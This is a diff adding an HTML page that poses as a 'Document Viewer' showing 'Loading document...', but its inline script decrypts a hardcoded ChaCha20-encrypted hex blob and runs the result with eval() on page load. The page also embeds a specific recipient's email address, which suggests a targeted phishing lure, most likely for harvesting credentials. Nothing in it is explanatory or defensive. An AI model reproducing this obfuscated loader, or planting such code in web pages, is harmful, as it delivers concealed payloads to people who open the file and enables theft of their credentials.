@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Document Viewer</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+    <div>Loading document...</div>
+    
+    <script>
+    var s = "jaco@smei.co.za";
+    var W = "27cb113b306d336b91684c75aebc31e3cec659c8722cc5999873a5cddcc7ab663c1b7b1ffd1eeb84452d660479276415cd797ea3778c0c5d368b4abc73b989313c2a202a3b4d2c067631339c80d9ef2f37d0869af467d19dffbb981b331ce1b2017e3e5f5155450faf6831fb6c0dd5babcdb7c08";
+    
+    // Hex to binary conversion
+    var k = new Uint8Array(W.length / 2);
+    for (var w = 0; w < W.length; w += 2) {
+        k[w / 2] = parseInt(W.substr(w, 2), 16);
+    }
+    
+    // Extract key, nonce, cipher
+    var t = k.slice(0, 32);
+    var h = k.slice(32, 44);
+    var e = k.slice(44);
+    var K = "";
+    
+    // ChaCha20 decoder
+    for (var x = 0; x < e.length; x += 64) {
+        var O = [1634760805, 857760878, 2036477234, 1797285236];
+        
+        // Add key
+        for (var w = 0; w < 8; w++) {
+            var l = w * 4;
+            O.push(t[l] | t[l+1]<<8 | t[l+2]<<16 | t[l+3]<<24);
+        }
+        
+        // Add counter and nonce
+        O.push(x / 64);
+        for (var w = 0; w < 3; w++) {
+            var l = w * 4;
+            O.push(h[l] | h[l+1]<<8 | h[l+2]<<16 | h[l+3]<<24);
+        }
+        
+        var F = O.slice();
+        
+        // 20 rounds
+        for (var p = 0; p < 10; p++) {
+            // Column rounds
+            for (var q = 0; q < 4; q++) {
+                F[q] = (F[q] + F[q+4]) >>> 0;
+                F[q+12] ^= F[q];
+                F[q+12] = (F[q+12] << 16) | (F[q+12] >>> 16);
+                F[q+8] = (F[q+8] + F[q+12]) >>> 0;
+                F[q+4] ^= F[q+8];
+                F[q+4] = (F[q+4] << 12) | (F[q+4] >>> 20);
+                F[q] = (F[q] + F[q+4]) >>> 0;
+                F[q+12] ^= F[q];
+                F[q+12] = (F[q+12] << 8) | (F[q+12] >>> 24);
+                F[q+8] = (F[q+8] + F[q+12]) >>> 0;
+                F[q+4] ^= F[q+8];
+                F[q+4] = (F[q+4] << 7) | (F[q+4] >>> 25);
+            }
+            // Diagonal rounds
+            F[0] = (F[0] + F[5]) >>> 0;
+            F[15] ^= F[0]; F[15] = (F[15] << 16) | (F[15] >>> 16);
+            F[10] = (F[10] + F[15]) >>> 0;
+            F[5] ^= F[10]; F[5] = (F[5] << 12) | (F[5] >>> 20);
+            F[0] = (F[0] + F[5]) >>> 0;
+            F[15] ^= F[0]; F[15] = (F[15] << 8) | (F[15] >>> 24);
+            F[10] = (F[10] + F[15]) >>> 0;
+            F[5] ^= F[10]; F[5] = (F[5] << 7) | (F[5] >>> 25);
+            
+            F[1] = (F[1] + F[6]) >>> 0;
+            F[12] ^= F[1]; F[12] = (F[12] << 16) | (F[12] >>> 16);
+            F[11] = (F[11] + F[12]) >>> 0;
+            F[6] ^= F[11]; F[6] = (F[6] << 12) | (F[6] >>> 20);
+            F[1] = (F[1] + F[6]) >>> 0;
+            F[12] ^= F[1]; F[12] = (F[12] << 8) | (F[12] >>> 24);
+            F[11] = (F[11] + F[12]) >>> 0;
+            F[6] ^= F[11]; F[6] = (F[6] << 7) | (F[6] >>> 25);
+            
+            F[2] = (F[2] + F[7]) >>> 0;
+            F[13] ^= F[2]; F[13] = (F[13] << 16) | (F[13] >>> 16);
+            F[8] = (F[8] + F[13]) >>> 0;
+            F[7] ^= F[8]; F[7] = (F[7] << 12) | (F[7] >>> 20);
+            F[2] = (F[2] + F[7]) >>> 0;
+            F[13] ^= F[2]; F[13] = (F[13] << 8) | (F[13] >>> 24);
+            F[8] = (F[8] + F[13]) >>> 0;
+            F[7] ^= F[8]; F[7] = (F[7] << 7) | (F[7] >>> 25);
+            
+            F[3] = (F[3] + F[4]) >>> 0;
+            F[14] ^= F[3]; F[14] = (F[14] << 16) | (F[14] >>> 16);
+            F[9] = (F[9] + F[14]) >>> 0;
+            F[4] ^= F[9]; F[4] = (F[4] << 12) | (F[4] >>> 20);
+            F[3] = (F[3] + F[4]) >>> 0;
+            F[14] ^= F[3]; F[14] = (F[14] << 8) | (F[14] >>> 24);
+            F[9] = (F[9] + F[14]) >>> 0;
+            F[4] ^= F[9]; F[4] = (F[4] << 7) | (F[4] >>> 25);
+        }
+        
+        // Add original state
+        for (var w = 0; w < 16; w++) {
+            F[w] = (F[w] + O[w]) >>> 0;
+        }
+        
+        // Extract keystream and decode
+        var Z = Math.min(64, e.length - x);
+        for (var w = 0; w < Z; w++) {
+            var Y = (F[Math.floor(w / 4)] >> ((w % 4) * 8)) & 255;
+            K += String.fromCharCode(e[x + w] ^ Y);
+        }
+    }
+    
+    // Use Simple Encode execution method
+    eval(K);
+    </script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"b70961d5ed6d4b90acb0c74a76484260","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
